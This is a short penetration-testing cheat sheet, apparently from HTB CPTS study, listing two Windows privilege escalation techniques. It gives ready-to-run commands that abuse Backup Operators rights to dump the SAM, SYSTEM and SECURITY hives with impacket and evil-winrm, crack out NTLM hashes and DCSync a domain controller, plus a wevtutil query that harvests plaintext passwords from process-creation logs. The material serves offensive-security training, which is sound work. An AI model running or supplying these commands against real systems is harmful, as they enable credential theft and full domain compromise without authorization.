# Windows Privilege Escalation

### SeBackupPrivilege (Backup Operators) → Registry Hive Dump → Secrets (HTB CPTS) [added: 2026-04]
- **Tags:** #SeBackupPrivilege #BackupOperators #RegistryDump #SecretsDump #Impacket #Windows #PrivEsc #DCSync
- **Trigger:** Compromised user is member of Backup Operators group or holds SeBackupPrivilege token
- **Prereq:** User with SeBackupPrivilege + WinRM or RDP access to the target (typically a Domain Controller)
- **Yields:** SAM/SYSTEM/SECURITY hive extraction leading to NTLM hashes, machine account hashes, and potential DCSync for full domain compromise
- **Opsec:** Med
- **Context:** User is in Backup Operators group and has WinRM access. SeBackupPrivilege allows reading any file including registry hives.
- **Payload/Method:**
```bash
# Step 1: Save hives using impacket-reg (remote, via proxychains)
proxychains impacket-reg svc_veracrypt:'password'@<DC_IP> backup -o 'C:\Windows\Tasks\'

# Step 2: Download hives via evil-winrm
proxychains evil-winrm -i <DC_IP> -u svc_veracrypt -p 'password'
download C:\Windows\Tasks\SYSTEM.save
download C:\Windows\Tasks\SAM.save
download C:\Windows\Tasks\SECURITY.save

# Step 3: Decrypt locally
impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL

# Step 4: Use DC machine account hash to DCSync
proxychains impacket-secretsdump 'DC02$'@<DC_IP> -hashes :<MACHINE_NTLM>
```

### Windows Event Log Credential Leakage (HTB CPTS) [added: 2026-04]
- **Tags:** #EventLogCreds #WindowsLogs #CredentialLeakage #ProcessAuditing #EventID4688 #Windows #PostExploitation
- **Trigger:** Access to Windows Security event logs and process creation auditing (Event ID 4688) is enabled
- **Prereq:** User with Event Log read access (Event Log Readers group or admin) + process command-line auditing enabled
- **Yields:** Plaintext credentials leaked via command-line arguments in process creation events (net use, runas, etc.)
- **Opsec:** Low
- **Context:** Credentials passed as command-line arguments are logged in Security event logs (Event ID 4688 with process audit enabled).
- **Payload/Method:**
```powershell
# From low-privilege user with Event Log read access
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Look for: net use ... /user:<username> <password>
```
